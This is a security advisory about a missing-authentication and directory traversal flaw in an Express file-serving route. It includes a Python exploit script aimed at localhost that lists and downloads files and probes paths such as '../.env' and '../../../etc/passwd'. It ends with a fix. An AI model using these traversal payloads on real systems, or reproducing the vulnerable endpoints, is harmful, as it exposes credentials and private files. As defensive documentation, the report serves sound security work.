# Vulnerability: Unauthenticated File Access & Directory Listing

## 1. Vulnerability Name
**CWE-306: Missing Authentication for Critical Function**

## 2. Location in Code
- **File:** `backend/src/routes/fileExecution.js` (lines 42-60, 62-85)

```javascript
// fileExecution.js - Unauthenticated file access
router.get('/raw/:filename', async (req, res) => {
    try {
        const { filename } = req.params;
        
        // VULNERABILITY: No authentication required
        // VULNERABILITY: Directory traversal possible
        const filePath = path.join(__dirname, '..', 'uploads', filename);
        
        if (fs.existsSync(filePath)) {
            // VULNERABILITY: Serve any file type including executables
            res.sendFile(path.resolve(filePath));
        } else {
            res.status(404).json({ error: 'File not found' });
        }
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// fileExecution.js - Unauthenticated directory listing
router.get('/list-all', async (req, res) => {
    try {
        const uploadsDir = path.join(__dirname, '..', 'uploads');
        
        // VULNERABILITY: No authentication required
        const files = fs.readdirSync(uploadsDir).map(filename => {
            const filePath = path.join(uploadsDir, filename);
            const stats = fs.statSync(filePath);
            
            return {
                filename,
                size: stats.size,
                created: stats.birthtime,
                modified: stats.mtime,
                // VULNERABILITY: Expose full system path
                fullPath: filePath,
                isExecutable: stats.mode & parseInt('111', 8)
            };
        });
        
        res.json({
            files,
            totalFiles: files.length,
            // VULNERABILITY: Expose server directory structure
            serverPath: uploadsDir
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});
```

## 3. Technical Root Cause
The application provides unauthenticated endpoints that allow anyone to access uploaded files and list all files in the uploads directory. No authentication or authorization checks are performed, enabling complete bypass of access controls.

## 4. Proof of Concept Explanation
1. Access the `/api/files/list-all` endpoint without authentication
2. Retrieve a list of all uploaded files with metadata
3. Download any file using `/api/files/raw/:filename` without authentication
4. Use directory traversal to access files outside the uploads directory

## 5. Exploit Script

```python
#!/usr/bin/env python3
import requests

def exploit_unauthenticated_access():
    base_url = "http://localhost:5000"
    
    print("[+] Testing unauthenticated file access...")
    
    # Test 1: List all files without authentication
    print("\n[1] Testing unauthenticated file listing...")
    list_response = requests.get(f"{base_url}/api/files/list-all")
    
    if list_response.status_code == 200:
        files_data = list_response.json()
        files = files_data.get('files', [])
        
        print("[!] UNAUTHENTICATED ACCESS CONFIRMED")
        print(f"[+] Retrieved {len(files)} files without authentication")
        print(f"[+] Server path exposed: {files_data.get('serverPath')}")
        
        for file_info in files[:5]:  # Show first 5 files
            print(f"    File: {file_info.get('filename')}")
            print(f"    Size: {file_info.get('size')} bytes")
            print(f"    Full Path: {file_info.get('fullPath')}")
            print(f"    Executable: {file_info.get('isExecutable')}")
            print("    ---")
        
        # Test 2: Download files without authentication
        if files:
            target_file = files[0]['filename']
            print(f"\n[2] Testing unauthenticated file download: {target_file}")
            
            download_response = requests.get(f"{base_url}/api/files/raw/{target_file}")
            
            if download_response.status_code == 200:
                print("[!] FILE DOWNLOAD SUCCESS")
                print(f"[+] Downloaded {len(download_response.content)} bytes")
                print(f"[+] Content type: {download_response.headers.get('content-type')}")
    
    # Test 3: Directory traversal attempts
    print("\n[3] Testing directory traversal...")
    traversal_paths = [
        "../package.json",
        "../../package.json", 
        "../.env",
        "../src/config/database.js",
        "../../../etc/passwd"
    ]
    
    for path in traversal_paths:
        traversal_response = requests.get(f"{base_url}/api/files/raw/{path}")
        
        if traversal_response.status_code == 200:
            print(f"[!] DIRECTORY TRAVERSAL SUCCESS: {path}")
            content_preview = traversal_response.text[:200]
            print(f"[+] Content preview: {content_preview}...")
        elif traversal_response.status_code != 404:
            print(f"[?] Unexpected response for {path}: {traversal_response.status_code}")
    
    # Test 4: Access sensitive application files
    print("\n[4] Testing access to application files...")
    app_files = [
        "../app.js",
        "../server.js", 
        "../models/User.js",
        "../routes/auth.js"
    ]
    
    for app_file in app_files:
        app_response = requests.get(f"{base_url}/api/files/raw/{app_file}")
        
        if app_response.status_code == 200:
            print(f"[!] APPLICATION FILE ACCESS: {app_file}")
            print(f"[+] File size: {len(app_response.content)} bytes")
    
    return True

if __name__ == "__main__":
    exploit_unauthenticated_access()
```

## 6. Impact
- **Complete Data Breach:** Access to all uploaded files without authentication
- **Information Disclosure:** Server paths and directory structure exposed
- **Privacy Violation:** Unauthorized access to sensitive documents
- **Compliance Risk:** Violation of data protection regulations

**CVSS Score:** 8.6 (High)

## 7. Fix Recommendation

Remove unauthenticated endpoints and implement proper access controls:

```javascript
// Remove unauthenticated endpoints entirely
// DELETE: router.get('/raw/:filename', ...)
// DELETE: router.get('/list-all', ...)

// Implement secure authenticated file access
router.get('/download/:documentId', auth, async (req, res) => {
    try {
        const { documentId } = req.params;
        
        // Verify document ownership and permissions
        const document = await Document.findOne({
            _id: documentId,
            $or: [
                { userId: req.user._id },
                { 
                    visibility: 'shared',
                    'sharedWith.userId': req.user._id 
                },
                { visibility: 'public' }
            ],
            tenantId: req.user.tenantId
        });
        
        if (!document) {
            return res.status(404).json({ error: 'Document not found' });
        }
        
        // Construct secure file path
        const uploadsDir = path.resolve(__dirname, '..', 'uploads');
        const filePath = path.join(uploadsDir, document.filename);
        
        // Verify path is within uploads directory
        if (!filePath.startsWith(uploadsDir)) {
            return res.status(400).json({ error: 'Invalid file path' });
        }
        
        if (!fs.existsSync(filePath)) {
            return res.status(404).json({ error: 'File not found on disk' });
        }
        
        // Set appropriate headers
        res.setHeader('Content-Disposition', `attachment; filename="${document.originalName}"`);
        res.setHeader('Content-Type', 'application/octet-stream');
        
        res.sendFile(filePath);
    } catch (error) {
        res.status(500).json({ error: 'Download failed' });
    }
});

// Secure file listing with proper authorization
router.get('/my-files', auth, async (req, res) => {
    try {
        const documents = await Document.find({
            userId: req.user._id,
            tenantId: req.user.tenantId
        }).select('title originalName fileSize fileType createdAt visibility');
        
        res.json({ documents });
    } catch (error) {
        res.status(500).json({ error: 'Failed to retrieve files' });
    }
});

// Add rate limiting for file downloads
const rateLimit = require('express-rate-limit');

const downloadLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100, // Limit each IP to 100 downloads per windowMs
    message: 'Too many download requests, please try again later'
});

router.use('/download', downloadLimiter);
```